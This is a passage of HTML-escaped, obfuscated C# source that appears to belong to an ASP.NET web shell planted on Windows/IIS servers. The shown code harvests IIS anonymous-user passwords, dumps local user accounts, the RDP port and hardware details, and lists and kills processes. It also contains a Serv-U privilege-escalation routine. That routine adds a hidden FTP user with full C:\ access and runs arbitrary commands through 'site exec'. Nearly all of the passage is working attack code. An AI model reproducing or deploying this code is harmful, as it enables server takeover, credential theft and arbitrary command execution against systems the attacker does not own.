<br />
{<br />
<br />
return string.Format(&quot;{0:########0.00} G&quot;,((Double)fileSize)/(1024 * 1024 * 1024));<br />
<br />
}<br />
<br />
else if(fileSize &gt;= 1024 * 1024)<br />
<br />
{<br />
<br />
return string.Format(&quot;{0:####0.00} M&quot;,((Double)fileSize)/(1024 * 1024));<br />
<br />
}<br />
<br />
else if(fileSize &gt;= 1024)<br />
<br />
{<br />
<br />
return string.Format(&quot;{0:####0.00} K&quot;,((Double)fileSize)/ 1024);<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
return string.Format(&quot;{0} B&quot;,fileSize);<br />
<br />
}<br />
<br />
}<br />
<br />
private bool SGde(string sSrc)<br />
<br />
{<br />
<br />
Regex reg=new Regex(@&quot;^0|[0-9]*[1-9][0-9]*$&quot;);<br />
<br />
if(reg.IsMatch(sSrc))<br />
<br />
{<br />
<br />
return true;<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
return false;<br />
<br />
}<br />
<br />
}<br />
<br />
public void AdCx()<br />
<br />
{<br />
<br />
string qcKu=string.Empty;<br />
<br />
string mWGEm=&quot;IIS://localhost/W3SVC&quot;;<br />
<br />
GlI.Style.Add(&quot;word-break&quot;,&quot;break-all&quot;);<br />
<br />
try<br />
<br />
{<br />
<br />
DirectoryEntry HHzcY=new DirectoryEntry(mWGEm);<br />
<br />
int fmW=0;<br />
<br />
foreach(DirectoryEntry child in HHzcY.Children)<br />
<br />
{<br />
<br />
if(SGde(child.Name.ToString()))<br />
<br />
{<br />
<br />
fmW++;<br />
<br />
DirectoryEntry newdir=new DirectoryEntry(mWGEm+&quot;/&quot;+child.Name.ToString());<br />
<br />
DirectoryEntry HlyU=newdir.Children.Find(&quot;root&quot;,&quot;IIsWebVirtualDir&quot;);<br />
<br />
string bg=OKM();<br />
<br />
TableRow TR=new TableRow();<br />
<br />
TR.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
TR.CssClass=bg;<br />
<br />
TR.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
TR.Attributes[&quot;title&quot;]=&quot;Site:&quot;+child.Properties[&quot;ServerComment&quot;].Value.ToString();<br />
<br />
for(int i=1;i&lt;6;i++)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
TableCell tfit=new TableCell();<br />
<br />
switch(i)<br />
<br />
{case 1:<br />
<br />
tfit.Text=fmW.ToString();<br />
<br />
break;<br />
<br />
case 2:<br />
<br />
tfit.Text=HlyU.Properties[&quot;AnonymousUserName&quot;].Value.ToString();<br />
<br />
break;<br />
<br />
case 3:<br />
<br />
tfit.Text=HlyU.Properties[&quot;AnonymousUserPass&quot;].Value.ToString();<br />
<br />
break;<br />
<br />
case 4:<br />
<br />
StringBuilder sb=new StringBuilder();<br />
<br />
PropertyValueCollection pc=child.Properties[&quot;ServerBindings&quot;];<br />
<br />
for (int j=0; j &lt; pc.Count; j++)<br />
<br />
{<br />
<br />
sb.Append(pc[j].ToString()+&quot;&lt;br&gt;&quot;);<br />
<br />
}<br />
<br />
tfit.Text=sb.ToString().Substring(0,sb.ToString().Length-4);<br />
<br />
break;<br />
<br />
case 5:<br />
<br />
tfit.Text=&quot;&lt;a href=\&quot;javascript:Bin_PostBack(&#039;Bin_Listdir&#039;,&#039;&quot;+MVVJ(HlyU.Properties[&quot;Path&quot;].Value.ToString())+&quot;&#039;)\&quot;&gt;&quot;+HlyU.Properties[&quot;Path&quot;].Value.ToString()+&quot;&lt;/a&gt;&quot;;<br />
<br />
break;<br />
<br />
}<br />
<br />
TR.Cells.Add(tfit);<br />
<br />
}<br />
<br />
catch (Exception ex)<br />
<br />
{<br />
<br />
xseuB(ex.Message);<br />
<br />
continue;<br />
<br />
}<br />
<br />
}<br />
<br />
GlI.Controls.Add(TR);<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception ex)<br />
<br />
{<br />
<br />
xseuB(ex.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
public ManagementObjectCollection PhQTd(string query)<br />
<br />
{<br />
<br />
ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));<br />
<br />
return QS.Get();<br />
<br />
}<br />
<br />
public DataTable cCf(string query)<br />
<br />
{<br />
<br />
DataTable dt=new DataTable();<br />
<br />
int i=0;<br />
<br />
ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));<br />
<br />
try<br />
<br />
{<br />
<br />
foreach(ManagementObject m in QS.Get())<br />
<br />
{<br />
<br />
DataRow dr=dt.NewRow();<br />
<br />
PropertyDataCollection.PropertyDataEnumerator oEnum;<br />
<br />
oEnum=(m.Properties.GetEnumerator()as PropertyDataCollection.PropertyDataEnumerator);<br />
<br />
while(oEnum.MoveNext())<br />
<br />
{<br />
<br />
PropertyData DRU=(PropertyData)oEnum.Current;<br />
<br />
if(dt.Columns.IndexOf(DRU.Name)==-1)<br />
<br />
{<br />
<br />
dt.Columns.Add(DRU.Name);<br />
<br />
dt.Columns[dt.Columns.Count-1].DefaultValue=&quot;&quot;;<br />
<br />
}<br />
<br />
if(m[DRU.Name]!=null)<br />
<br />
{<br />
<br />
dr[DRU.Name]=m[DRU.Name].ToString();<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
dr[DRU.Name]=string.Empty;<br />
<br />
}<br />
<br />
}<br />
<br />
dt.Rows.Add(dr);<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
}<br />
<br />
return dt;<br />
<br />
}<br />
<br />
public void YUw()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
Bin_H2_Title.InnerText=&quot;Process &gt;&gt;&quot;;<br />
<br />
WICxe();<br />
<br />
DCbS.Visible=true;<br />
<br />
int UEbTI=0;<br />
<br />
Process[] p=Process.GetProcesses();<br />
<br />
foreach(Process sp in p)<br />
<br />
{<br />
<br />
UEbTI++;<br />
<br />
string bg=OKM();<br />
<br />
TableRow tr=new TableRow();<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
for(int i=1;i&lt;7;i++)<br />
<br />
{<br />
<br />
TableCell td=new TableCell();<br />
<br />
if(i==1)<br />
<br />
{<br />
<br />
td.Width=Unit.Parse(&quot;2%&quot;);<br />
<br />
td.Text=UEbTI.ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==2)<br />
<br />
{<br />
<br />
td.Text=sp.Id.ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==3)<br />
<br />
{<br />
<br />
td.Text=sp.ProcessName.ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==4)<br />
<br />
{<br />
<br />
td.Text=sp.Threads.Count.ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==5)<br />
<br />
{<br />
<br />
td.Text=sp.BasePriority.ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==6)<br />
<br />
{<br />
<br />
td.Text=&quot;--&quot;;<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
}<br />
<br />
IjsL.Controls.Add(tr);<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
AIz();<br />
<br />
}<br />
<br />
AIz();<br />
<br />
}<br />
<br />
public void AIz()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
Bin_H2_Title.InnerText=&quot;Process &gt;&gt;&quot;;<br />
<br />
WICxe();<br />
<br />
DCbS.Visible=true;<br />
<br />
int UEbTI=0;<br />
<br />
DataTable dt=cCf(&quot;Win32_Process&quot;);<br />
<br />
for(int j=0;j&lt;dt.Rows.Count;j++)<br />
<br />
{<br />
<br />
UEbTI++;<br />
<br />
string bg=OKM();<br />
<br />
TableRow tr=new TableRow();<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
for(int i=1;i&lt;7;i++)<br />
<br />
{<br />
<br />
TableCell td=new TableCell();<br />
<br />
if(i==1)<br />
<br />
{<br />
<br />
td.Width=Unit.Parse(&quot;2%&quot;);<br />
<br />
td.Text=UEbTI.ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==2)<br />
<br />
{<br />
<br />
td.Text=dt.Rows[j][&quot;ProcessID&quot;].ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==3)<br />
<br />
{<br />
<br />
td.Text=dt.Rows[j][&quot;Name&quot;].ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==4)<br />
<br />
{<br />
<br />
td.Text=dt.Rows[j][&quot;ThreadCount&quot;].ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==5)<br />
<br />
{<br />
<br />
td.Text=dt.Rows[j][&quot;Priority&quot;].ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==6)<br />
<br />
{<br />
<br />
if( dt.Rows[j][&quot;CommandLine&quot;]!=string.Empty)<br />
<br />
{<br />
<br />
td.Text=&quot;&lt;a href=\&quot;javascript:Bin_PostBack(&#039;urJG&#039;,&#039;&quot;+dt.Rows[j][&quot;ProcessID&quot;].ToString()+&quot;&#039;)\&quot;&gt;Kill&lt;/a&gt;&quot;;<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
td.Text=&quot;--&quot;;<br />
<br />
}<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
}<br />
<br />
IjsL.Controls.Add(tr);<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
public void urJG(string pid)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
foreach(ManagementObject p in PhQTd(&quot;Select * from Win32_Process Where ProcessID =&#039;&quot;+pid+&quot;&#039;&quot;))<br />
<br />
{<br />
<br />
p.InvokeMethod(&quot;Terminate&quot;,null);<br />
<br />
p.Dispose();<br />
<br />
}<br />
<br />
xseuB(&quot;Process Kill Success !&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
AIz();<br />
<br />
}<br />
<br />
public void oHpF()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
Bin_H2_Title.InnerText=&quot;Services &gt;&gt;&quot;;<br />
<br />
WICxe();<br />
<br />
iQxm.Visible=true;<br />
<br />
int UEbTI=0;<br />
<br />
ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();<br />
<br />
for(int i=0;i&lt;kQmRu.Length;i++)<br />
<br />
{<br />
<br />
UEbTI++;<br />
<br />
string bg=OKM();<br />
<br />
TableRow tr=new TableRow();<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
for(int b=1;b&lt;7;b++)<br />
<br />
{<br />
<br />
TableCell td=new TableCell();<br />
<br />
if(b==1)<br />
<br />
{<br />
<br />
td.Width=Unit.Parse(&quot;2%&quot;);<br />
<br />
td.Text=UEbTI.ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(b==2)<br />
<br />
{<br />
<br />
td.Text=&quot;null&quot;;<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(b==3)<br />
<br />
{<br />
<br />
td.Text=kQmRu[i].ServiceName.ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(b==4)<br />
<br />
{<br />
<br />
td.Text=&quot;&quot;;<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(b==5)<br />
<br />
{<br />
<br />
string kOIo=kQmRu[i].Status.ToString();<br />
<br />
if(kOIo==&quot;Running&quot;)<br />
<br />
{<br />
<br />
td.Text=&quot;&lt;font color=green&gt;&quot;+kOIo+&quot;&lt;/font&gt;&quot;;<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
td.Text=&quot;&lt;font color=red&gt;&quot;+kOIo+&quot;&lt;/font&gt;&quot;;<br />
<br />
}<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(b==6)<br />
<br />
{<br />
<br />
td.Text=&quot;&quot;;<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
}<br />
<br />
vHCs.Controls.Add(tr);<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
public void tZRH()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
Bin_H2_Title.InnerText=&quot;Services &gt;&gt;&quot;;<br />
<br />
WICxe();<br />
<br />
iQxm.Visible=true;<br />
<br />
int UEbTI=0;<br />
<br />
DataTable dt=cCf(&quot;Win32_Service&quot;);<br />
<br />
for(int j=0;j&lt;dt.Rows.Count;j++)<br />
<br />
{<br />
<br />
UEbTI++;<br />
<br />
string bg=OKM();<br />
<br />
TableRow tr=new TableRow();<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
tr.Attributes[&quot;title&quot;]=dt.Rows[j][&quot;Description&quot;].ToString();<br />
<br />
for(int i=1;i&lt;7;i++)<br />
<br />
{<br />
<br />
TableCell td=new TableCell();<br />
<br />
if(i==1)<br />
<br />
{<br />
<br />
td.Width=Unit.Parse(&quot;2%&quot;);<br />
<br />
td.Text=UEbTI.ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==2)<br />
<br />
{<br />
<br />
td.Text=dt.Rows[j][&quot;ProcessID&quot;].ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==3)<br />
<br />
{<br />
<br />
td.Text=dt.Rows[j][&quot;Name&quot;].ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==4)<br />
<br />
{<br />
<br />
td.Text=dt.Rows[j][&quot;PathName&quot;].ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==5)<br />
<br />
{<br />
<br />
string kOIo=dt.Rows[j][&quot;State&quot;].ToString();<br />
<br />
if(kOIo==&quot;Running&quot;)<br />
<br />
{<br />
<br />
td.Text=&quot;&lt;font color=green&gt;&quot;+kOIo+&quot;&lt;/font&gt;&quot;;<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
td.Text=&quot;&lt;font color=red&gt;&quot;+kOIo+&quot;&lt;/font&gt;&quot;;<br />
<br />
}<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
if(i==6)<br />
<br />
{<br />
<br />
td.Text=dt.Rows[j][&quot;StartMode&quot;].ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
}<br />
<br />
}<br />
<br />
vHCs.Controls.Add(tr);<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
oHpF();<br />
<br />
}<br />
<br />
}<br />
<br />
public void PLd()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
WICxe();<br />
<br />
xWVQ.Visible=true;<br />
<br />
Bin_H2_Title.InnerText=&quot;User Information &gt;&gt;&quot;;<br />
<br />
DirectoryEntry TWQ=new DirectoryEntry(&quot;WinNT://&quot;+Environment.MachineName.ToString());<br />
<br />
foreach(DirectoryEntry child in TWQ.Children)<br />
<br />
{<br />
<br />
foreach(string name in child.Properties.PropertyNames)<br />
<br />
{<br />
<br />
PropertyValueCollection pvc=child.Properties[name];<br />
<br />
int c=pvc.Count;<br />
<br />
for(int i=0;i&lt;c;i++)<br />
<br />
{<br />
<br />
if(name!=&quot;objectSid&quot; &amp;&amp; name!=&quot;Parameters&quot; &amp;&amp; name!=&quot;LoginHours&quot;)<br />
<br />
{<br />
<br />
string bg=OKM();<br />
<br />
TableRow tr=new TableRow();<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
TableCell td=new TableCell();<br />
<br />
td.Text=name;<br />
<br />
tr.Controls.Add(td);<br />
<br />
TableCell td1=new TableCell();<br />
<br />
td1.Text=pvc[i].ToString();<br />
<br />
tr.Controls.Add(td1);<br />
<br />
VPa.Controls.Add(tr);<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
TableRow trn=new TableRow();<br />
<br />
for(int x=1;x&lt;3;x++)<br />
<br />
{<br />
<br />
TableCell tdn=new TableCell();<br />
<br />
tdn.Attributes[&quot;style&quot;]=&quot;height:2px;background-color:#bbbbbb;&quot;;<br />
<br />
trn.Controls.Add(tdn);<br />
<br />
VPa.Controls.Add(trn);<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
public void iLVUT()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
WICxe();<br />
<br />
xWVQ.Visible=true;<br />
<br />
Bin_H2_Title.InnerText=&quot;User Information &gt;&gt;&quot;;<br />
<br />
DataTable user=cCf(&quot;Win32_UserAccount&quot;);<br />
<br />
for(int i=0;i&lt;user.Rows.Count;i++)<br />
<br />
{<br />
<br />
for(int j=0;j&lt;user.Columns.Count;j++)<br />
<br />
{<br />
<br />
string bg=OKM();<br />
<br />
TableRow tr=new TableRow();<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
TableCell td=new TableCell();<br />
<br />
td.Text=user.Columns[j].ToString();<br />
<br />
tr.Controls.Add(td);<br />
<br />
TableCell td1=new TableCell();<br />
<br />
td1.Text=user.Rows[i][j].ToString();<br />
<br />
tr.Controls.Add(td1);<br />
<br />
VPa.Controls.Add(tr);<br />
<br />
}<br />
<br />
TableRow trn=new TableRow();<br />
<br />
for(int x=1;x&lt;3;x++)<br />
<br />
{<br />
<br />
TableCell tdn=new TableCell();<br />
<br />
tdn.Attributes[&quot;style&quot;]=&quot;height:2px;background-color:#bbbbbb;&quot;;<br />
<br />
trn.Controls.Add(tdn);<br />
<br />
VPa.Controls.Add(trn);<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
PLd();<br />
<br />
}<br />
<br />
}<br />
<br />
public void pDVM()<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
RegistryKey EeZ=Registry.LocalMachine.OpenSubKey(@&quot;SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot;);<br />
<br />
string IKjwH=DdmPl(EeZ,&quot;PortNumber&quot;);<br />
<br />
RegistryKey izN=Registry.LocalMachine.OpenSubKey(@&quot;HARDWARE\DESCRIPTION\System\CentralProcessor&quot;);<br />
<br />
int cpu=izN.SubKeyCount;<br />
<br />
RegistryKey mQII=Registry.LocalMachine.OpenSubKey(@&quot;HARDWARE\DESCRIPTION\System\CentralProcessor\0\&quot;);<br />
<br />
string NPPZ=DdmPl(mQII,&quot;ProcessorNameString&quot;);<br />
<br />
WICxe();<br />
<br />
ghaB.Visible=true;<br />
<br />
Bin_H2_Title.InnerText=&quot;System Information &gt;&gt;&quot;;<br />
<br />
Bin_H2_Mac.InnerText=&quot;MAC Information &gt;&gt;&quot;;<br />
<br />
Bin_H2_Driver.InnerText=&quot;Driver Information &gt;&gt;&quot;;<br />
<br />
StringBuilder yEwc=new StringBuilder();<br />
<br />
StringBuilder hwJeS=new StringBuilder();<br />
<br />
StringBuilder jXkaE=new StringBuilder();<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;Server Domain : &lt;/u&gt;&quot;+Request.ServerVariables[&quot;SERVER_NAME&quot;]+&quot;&lt;/li&gt;&quot;);<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;Server Ip : &lt;/u&gt;&quot;+Request.ServerVariables[&quot;LOCAL_ADDR&quot;]+&quot;:&quot;+Request.ServerVariables[&quot;SERVER_PORT&quot;]+&quot;&lt;/li&gt;&quot;);<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;Terminal Port : &lt;/u&gt;&quot;+IKjwH+&quot;&lt;/li&gt;&quot;);<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;Server OS : &lt;/u&gt;&quot;+Environment.OSVersion+&quot;&lt;/li&gt;&quot;);<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;Server Software : &lt;/u&gt;&quot;+Request.ServerVariables[&quot;SERVER_SOFTWARE&quot;]+&quot;&lt;/li&gt;&quot;);<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;Server UserName : &lt;/u&gt;&quot;+Environment.UserName+&quot;&lt;/li&gt;&quot;);<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;Server Time : &lt;/u&gt;&quot;+System.DateTime.Now.ToString()+&quot;&lt;/li&gt;&quot;);<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;Server TimeZone : &lt;/u&gt;&quot;+cCf(&quot;Win32_TimeZone&quot;).Rows[0][&quot;Caption&quot;]+&quot;&lt;/li&gt;&quot;);<br />
<br />
DataTable BIOS=cCf(&quot;Win32_BIOS&quot;);<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;Server BIOS : &lt;/u&gt;&quot;+BIOS.Rows[0][&quot;Manufacturer&quot;]+&quot; : &quot;+BIOS.Rows[0][&quot;Name&quot;]+&quot;&lt;/li&gt;&quot;);<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;CPU Count : &lt;/u&gt;&quot;+cpu.ToString()+&quot;&lt;/li&gt;&quot;);<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;CPU Version : &lt;/u&gt;&quot;+NPPZ+&quot;&lt;/li&gt;&quot;);<br />
<br />
DataTable upM=cCf(&quot;Win32_PhysicalMemory&quot;);<br />
<br />
Int64 oZnZV=0;<br />
<br />
for(int i=0;i&lt;upM.Rows.Count;i++)<br />
<br />
{<br />
<br />
oZnZV+=Int64.Parse(upM.Rows[0][&quot;Capacity&quot;].ToString());<br />
<br />
}<br />
<br />
yEwc.Append(&quot;&lt;li&gt;&lt;u&gt;Server upM : &lt;/u&gt;&quot;+mTG(oZnZV)+&quot;&lt;/li&gt;&quot;);<br />
<br />
DataTable dOza=cCf(&quot;Win32_NetworkAdapterConfiguration&quot;);<br />
<br />
for(int i=0;i&lt;dOza.Rows.Count;i++)<br />
<br />
{<br />
<br />
hwJeS.Append(&quot;&lt;li&gt;&lt;u&gt;Server MAC&quot;+i+&quot; : &lt;/u&gt;&quot;+dOza.Rows[i][&quot;Caption&quot;]+&quot;&lt;/li&gt;&quot;);<br />
<br />
if(dOza.Rows[i][&quot;MACAddress&quot;]!=string.Empty)<br />
<br />
{<br />
<br />
hwJeS.Append(&quot;&lt;li style=\&quot;list-style:none;\&quot;&gt;&lt;u&gt;Address : &lt;/u&gt;&quot;+dOza.Rows[i][&quot;MACAddress&quot;]+&quot;&lt;/li&gt;&quot;);<br />
<br />
}<br />
<br />
}<br />
<br />
DataTable Driver=cCf(&quot;Win32_SystemDriver&quot;);<br />
<br />
for (int i=0; i&lt;Driver.Rows.Count; i++)<br />
<br />
{<br />
<br />
jXkaE.Append(&quot;&lt;li&gt;&lt;u class=&#039;u1&#039;&gt;Server Driver&quot;+i+&quot; : &lt;/u&gt;&lt;u class=&#039;u2&#039;&gt;&quot;+Driver.Rows[i][&quot;Caption&quot;]+&quot;&lt;/u&gt; &quot;);<br />
<br />
if (Driver.Rows[i][&quot;PathName&quot;]!=string.Empty)<br />
<br />
{<br />
<br />
jXkaE.Append(&quot;Path : &quot;+Driver.Rows[i][&quot;PathName&quot;]);<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
jXkaE.Append(&quot;No path information&quot;);<br />
<br />
}<br />
<br />
jXkaE.Append(&quot;&lt;/li&gt;&quot;);<br />
<br />
}<br />
<br />
Bin_Ul_Sys.InnerHtml=yEwc.ToString();<br />
<br />
Bin_Ul_NetConfig.InnerHtml=hwJeS.ToString();<br />
<br />
Bin_Ul_Driver.InnerHtml=jXkaE.ToString();<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
public void ADCpk()<br />
<br />
{<br />
<br />
WICxe();<br />
<br />
APl.Visible=true;<br />
<br />
Bin_H2_Title.InnerText=&quot;Serv-U Exec &gt;&gt;&quot;;<br />
<br />
}<br />
<br />
public void lDODR()<br />
<br />
{<br />
<br />
string JGGg=string.Empty;<br />
<br />
string user=dNohJ.Value;<br />
<br />
string pass=NMd.Value;<br />
<br />
int port=Int32.Parse(HlQl.Value);<br />
<br />
string cmd=mHbjB.Value;<br />
<br />
string CRtK=&quot;user &quot;+user+&quot;\r\n&quot;;<br />
<br />
string jnNG=&quot;pass &quot;+pass+&quot;\r\n&quot;;<br />
<br />
string site=&quot;SITE MAINTENANCE\r\n&quot;;<br />
<br />
string mtoJb=&quot;-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n&quot;;<br />
<br />
string sutI=&quot;-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n&quot;;<br />
<br />
string iVDT=&quot;-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n&quot;;<br />
<br />
string zexn=&quot;QUIT\r\n&quot;;<br />
<br />
UHlA.Visible=true;<br />
<br />
try<br />
<br />
{<br />
<br />
tcp.Connect(&quot;127.0.0.1&quot;,port);<br />
<br />
tcp.ReceiveBufferSize=1024;<br />
<br />
NS=tcp.GetStream();<br />
<br />
Rev(NS);<br />
<br />
ZJiM(NS,CRtK);<br />
<br />
Rev(NS);<br />
<br />
ZJiM(NS,jnNG);<br />
<br />
Rev(NS);<br />
<br />
ZJiM(NS,site);<br />
<br />
Rev(NS);<br />
<br />
ZJiM(NS,mtoJb);<br />
<br />
Rev(NS);<br />
<br />
ZJiM(NS,sutI);<br />
<br />
Rev(NS);<br />
<br />
ZJiM(NS,iVDT);<br />
<br />
Rev(NS);<br />
<br />
Bin_Td_Res.InnerHtml+=&quot;&lt;font color=\&quot;green\&quot;&gt;&lt;b&gt;Exec Cmd.................\r\n&lt;/b&gt;&lt;/font&gt;&quot;;<br />
<br />
zvxm.Connect(Request.ServerVariables[&quot;LOCAL_ADDR&quot;],52521);<br />
<br />
NS1=zvxm.GetStream();<br />
<br />
Rev(NS1);<br />
<br />
ZJiM(NS1,&quot;user bin\r\n&quot;);<br />
<br />
Rev(NS1);<br />
<br />
ZJiM(NS1,&quot;pass binftp\r\n&quot;);<br />
<br />
Rev(NS1);<br />
<br />
ZJiM(NS1,&quot;site exec &quot;+cmd+&quot;\r\n&quot;);<br />
<br />
Rev(NS1);<br />
<br />
ZJiM(NS1,&quot;quit\r\n&quot;);<br />
<br />
Rev(NS1);<br />
<br />
zvxm.Close();<br />
<br />
ZJiM(NS,mtoJb);<br />
<br />
Rev(NS);<br />
<br />
tcp.Close();<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
protected void Rev(NetworkStream instream)<br />
<br />
{<br />
<br />
string FTBtf=string.Empty;<br />
<br />
if(instream.CanRead)<br />
<br />
{<br />
<br />
